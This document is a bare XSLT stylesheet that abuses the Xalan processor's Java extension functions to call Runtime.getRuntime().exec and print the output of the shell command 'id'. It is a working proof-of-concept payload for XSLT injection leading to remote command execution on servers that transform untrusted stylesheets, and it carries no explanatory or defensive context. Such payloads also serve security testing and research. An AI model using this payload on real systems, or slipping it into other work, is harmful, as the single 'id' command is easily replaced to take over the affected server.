<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:proc="http://xml.apache.org/xalan/java/java.lang.ProcessBuilder"
  exclude-result-prefixes="rt proc">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="proc" select="rt:exec($rt,'id')"/>
    <xsl:value-of select="proc:getInputStream($proc)"/>
  </xsl:template>
</xsl:stylesheet>